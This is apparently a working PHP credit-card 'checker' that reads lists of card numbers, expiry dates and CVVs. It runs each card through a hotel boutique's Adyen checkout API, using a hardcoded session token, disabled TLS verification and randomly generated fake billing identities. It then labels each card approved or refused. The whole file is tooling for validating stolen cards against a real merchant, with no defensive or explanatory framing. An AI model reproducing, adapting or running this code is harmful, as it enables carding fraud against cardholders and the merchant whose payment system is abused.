<?php
ignore_user_abort();
error_reporting(0);
session_start();

// HEADERS JSON PARA EL INDEX.HTML
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Manejar preflight requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

// Verificar si se recibió la lista
if (!isset($_GET['lista']) || empty(trim($_GET['lista']))) {
    echo json_encode([
        'status' => 'error',
        'message' => 'No se recibió lista de tarjetas',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">No se recibió lista...</span>'
    ]);
    exit();
}

$lista = trim($_GET['lista']);
$delemitador = array("|", ";", ":", "/", "»", "«", ">", "<");

// Validar formato
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);
if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Formato de lista inválido',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">Lista inválida...</span>'
    ]);
    exit();
}

$cc = multiexplode($delemitador, $lista)[0];
$mes = multiexplode($delemitador, $lista)[1];
$ano = multiexplode($delemitador, $lista)[2];
$cvv = multiexplode($delemitador, $lista)[3];

// Formatear fecha
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

// Determinar tipo de tarjeta
$re = array(
    "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
    "Master" => "/^5[1-5]\d{14}$/",
    "Amex" => "/^3[47]\d{13,14}$/",
    "Elo" => "/^((((636368)|(438935)|(504175)|(650905)|(451416)|(636297))\d{0,10})|((5067)|(4576)|(6550)|(6516)|(6504)||(6509)|(4011))\d{0,12})$/",
    "hipercard" => "/^(606282\d{10}(\d{3})?)|(3841\d{15})$/",
);

if (preg_match($re['Visa'], $cc)) {
    $tipo = "Visa";
} else if (preg_match($re['Amex'], $cc)) {
    $tipo = "Amex";
} else if (preg_match($re['Master'], $cc)) {
    $tipo = "Master";
} else if (preg_match($re['Elo'], $cc)) {
    $tipo = "Elo";
} else if (preg_match($re['hipercard'], $cc)) {
    $tipo = "Hipercard";
} else {
    echo json_encode([
        'status' => 'rejected',
        'message' => 'Cartão não suportado',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">Cartão não suportado</span>'
    ]);
    exit();
}

// CONFIGURACIÓN SHANGRI-LA
$client_id = "14";
$promotion_id = "1";
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$api_locale = "en";
$adyen_version = "_0_1_25";
$adyen_key = "10001|EA9DDE733BC69B0DF0AA6AAB6CAC1A8EE7D2D5BA830C670D2EABF9133B098A88BE1F8ABBDD999BA3A5B36465941FE09D95A4A9A1A53C815583DA1932C926B5C8F4023A183CEF755DE196D2FA9474F97DB47B4647A45D35AB9198EC492006C999680E0592005F1C1400B041ECE0282FF58BCD66DFA4B98CC262E0A450DD623FB57A4F2C05A624958F02F4D764FAE903362EC07457A970F9F64512AA8DC6008CEC94C1A675F6432BC1070BCB311462FB52EC23B3FE568A7D7B154506C91544671A43729520C448698CF590A6682F2BB4BDC95B9267361266A57EC68EC0830AD6ECDCC3447C049578787601685B98926471BE6F5BF1E8A1E97FD13009844A0B82E7";
$return_url = "https://boutique.shangri-la.com/adyen_card_redirect.php";
$hotel_code = "ISL";
$site_login_token = "beQDmTL1oVRPZmOLWQdnFXCtRC4Eu5M81h3KtAiWIM0VMTki7RXw9RPrFlXLhoP42a5YNETYAcPVdmv8";

// Función para hacer peticiones CURL
function makeRequest($url, $data, $headers = []) {
    $ch = curl_init();
    
    $defaultHeaders = [
        "Accept: application/json",
        "Content-Type: application/json",
        "Referer: https://boutique.shangri-la.com/food_checkout.php",
        "Origin: https://boutique.shangri-la.com",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $defaultHeaders,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'response' => $response,
        'http_code' => $http_code,
        'error' => $error,
        'success' => $http_code == 200 && empty($error)
    ];
}

// PASO 1: CREAR ORDEN
$init_data = [
    "client_id" => $client_id,
    "promotion_id" => $promotion_id,
    "lang" => $api_locale,
    "site_login_token" => $site_login_token,
    "hotel_code" => $hotel_code,
    "return_url" => $return_url,
    "order_amount" => 100,
    "payment_method" => "adyen"
];

$init_result = makeRequest($api_endpoint . "/checkout_init.php", $init_data);

if (!$init_result['success']) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Error al crear orden',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">HTTP ' . $init_result['http_code'] . ' - ' . $init_result['error'] . '</span>'
    ]);
    exit();
}

$init_response = json_decode($init_result['response'], true);

if (!$init_response || !isset($init_response['order_number'])) {
    echo json_encode([
        'status' => 'rejected',
        'message' => 'Error en creación de orden',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">No se pudo crear orden</span>'
    ]);
    exit();
}

$order_number = $init_response['order_number'];
$order_token = $init_response['order_token'];
$order_amount = isset($init_response['order_amount']) ? $init_response['order_amount'] : 100;

// Para mes en formato simple (1-12)
$mes2 = (int)$mes;

// PASO 2: ENCRIPTAR TARJETA
$encrypt_data = [
    "client_id" => $client_id,
    "promotion_id" => $promotion_id,
    "lang" => $api_locale,
    "site_login_token" => $site_login_token,
    "order_number" => $order_number,
    "order_token" => $order_token,
    "card" => $cc,
    "month" => $mes2,
    "year" => $ano,
    "cvv" => $cvv,
    "adyen_key" => $adyen_key,
    "adyen_version" => $adyen_version
];

$encrypt_result = makeRequest($api_endpoint . "/adyen_encrypt.php", $encrypt_data);

if (!$encrypt_result['success']) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Error al encriptar tarjeta',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">HTTP ' . $encrypt_result['http_code'] . ' - ' . $encrypt_result['error'] . '</span>'
    ]);
    exit();
}

$encrypted_response = json_decode($encrypt_result['response'], true);

if (!$encrypted_response || !isset($encrypted_response['encryptedCardNumber'])) {
    echo json_encode([
        'status' => 'rejected',
        'message' => 'Error en encriptación',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">Error en encriptación</span>'
    ]);
    exit();
}

$encryptedCardNumber = $encrypted_response['encryptedCardNumber'];
$encryptedExpiryMonth = $encrypted_response['encryptedExpiryMonth'];
$encryptedExpiryYear = $encrypted_response['encryptedExpiryYear'];
$encryptedSecurityCode = $encrypted_response['encryptedSecurityCode'];

// Datos para el pago (nombre aleatorio)
$nomes = array('Christo','Ryan','Ethan','John','Zoey','Sarah','Pedro','Lucas','Alex','Ana');
$sobrenomes = array('Walker','Thompson','Anderson','Johnson','Trembay','Peltier','Soares','Souza','Esquilo','Bila');
$name = $nomes[mt_rand(0, count($nomes) - 1)];
$sobre = $sobrenomes[mt_rand(0, count($sobrenomes) - 1)];

// PASO 3: PROCESAR PAGO
$process_data = [
    "client_id" => $client_id,
    "promotion_id" => $promotion_id,
    "lang" => $api_locale,
    "site_login_token" => $site_login_token,
    "order_number" => $order_number,
    "order_token" => $order_token,
    "hotel_code" => $hotel_code,
    "encryptedCardNumber" => $encryptedCardNumber,
    "encryptedExpiryMonth" => $encryptedExpiryMonth,
    "encryptedExpiryYear" => $encryptedExpiryYear,
    "encryptedSecurityCode" => $encryptedSecurityCode,
    "amount" => [
        "value" => $order_amount,
        "currency" => "HKD"
    ],
    "return_url" => $return_url,
    "payment_method" => "adyen",
    "card_type" => $tipo,
    "billing_address" => [
        "firstName" => $name,
        "lastName" => $sobre,
        "email" => strtolower($name) . "." . strtolower($sobre) . "@gmail.com",
        "phone" => "+852" . mt_rand(50000000, 99999999),
        "address" => [
            "street" => "Flat 12B, Tower 1",
            "houseNumberOrName" => "The Arch",
            "city" => "Hong Kong",
            "postalCode" => "000000",
            "country" => "HK"
        ]
    ]
];

$process_result = makeRequest($api_endpoint . "/adyen_process.php", $process_data);

if (!$process_result['success']) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Error al procesar pago',
        'html' => '<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ <span class="badge badge-warning">HTTP ' . $process_result['http_code'] . ' - ' . $process_result['error'] . '</span>'
    ]);
    exit();
}

$process_response = json_decode($process_result['response'], true);

// DETERMINAR RESULTADO
if (isset($process_response['resultCode'])) {
    switch($process_response['resultCode']) {
        case 'Authorised':
            echo json_encode([
                'status' => 'approved',
                'message' => 'Pago autorizado',
                'html' => '<span class="badge badge-success">✅ APROVADA</span> ➔ ' .
                         '<span class="badge badge-success">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                         '<span class="badge badge-warning">SHANGRI-LA EXPRESS</span>',
                'data' => [
                    'card_last4' => substr($cc, -4),
                    'bin' => substr($cc, 0, 6),
                    'expiry' => $mes . '/' . substr($ano, -2),
                    'result' => 'Authorised',
                    'order_number' => $order_number,
                    'auth_code' => isset($process_response['authCode']) ? $process_response['authCode'] : null,
                    'psp_reference' => isset($process_response['pspReference']) ? $process_response['pspReference'] : null,
                    'amount' => number_format($order_amount/100, 2) . ' HKD'
                ]
            ]);
            break;
            
        case 'Refused':
            $reason = isset($process_response['refusalReason']) ? $process_response['refusalReason'] : 'Rechazado';
            echo json_encode([
                'status' => 'rejected',
                'message' => $reason,
                'html' => '<span class="badge badge-danger">❌ REPROVADA</span> ➔ ' .
                         '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                         '<span class="badge badge-warning">' . $reason . '</span>',
                'data' => [
                    'card_last4' => substr($cc, -4),
                    'reason' => $reason,
                    'order_number' => $order_number
                ]
            ]);
            break;
            
        case 'Error':
        case 'Cancelled':
            $reason = isset($process_response['refusalReason']) ? $process_response['refusalReason'] : $process_response['resultCode'];
            echo json_encode([
                'status' => 'error',
                'message' => $reason,
                'html' => '<span class="badge badge-warning">⚠️ ERROR</span> ➔ ' .
                         '<span class="badge badge-warning">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                         '<span class="badge badge-warning">' . $reason . '</span>',
                'data' => [
                    'card_last4' => substr($cc, -4),
                    'reason' => $reason,
                    'order_number' => $order_number
                ]
            ]);
            break;
            
        default:
            echo json_encode([
                'status' => 'unknown',
                'message' => 'Respuesta desconocida: ' . $process_response['resultCode'],
                'html' => '<span class="badge badge-warning">⚠️ REVISAR</span> ➔ ' .
                         '<span class="badge badge-warning">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
                         '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                         '<span class="badge badge-warning">' . $process_response['resultCode'] . '</span>',
                'data' => [
                    'card_last4' => substr($cc, -4),
                    'result_code' => $process_response['resultCode'],
                    'full_response' => $process_response
                ]
            ]);
    }
} elseif (isset($process_response['action'])) {
    // 3D Secure requerido
    echo json_encode([
        'status' => '3d_secure',
        'message' => '3D Secure requerido',
        'html' => '<span class="badge badge-info">🔄 3D SECURE</span> ➔ ' .
                 '<span class="badge badge-success">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
                 '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                 '<span class="badge badge-warning">3D Secure requerido</span>',
        'data' => [
            'card_last4' => substr($cc, -4),
            'action_url' => isset($process_response['action']['url']) ? $process_response['action']['url'] : null,
            'action_method' => isset($process_response['action']['method']) ? $process_response['action']['method'] : null,
            'order_number' => $order_number
        ]
    ]);
} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'Respuesta inesperada de la API',
        'html' => '<span class="badge badge-danger">❌ ERROR</span> ➔ ' .
                 '<span class="badge badge-danger">' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . '</span> ➔ ' .
                 '<span class="badge badge-info">' . $tipo . '</span> ➔ ' .
                 '<span class="badge badge-warning">Respuesta inesperada</span>',
        'data' => [
            'card_last4' => substr($cc, -4),
            'raw_response' => $process_response
        ]
    ]);
}
?>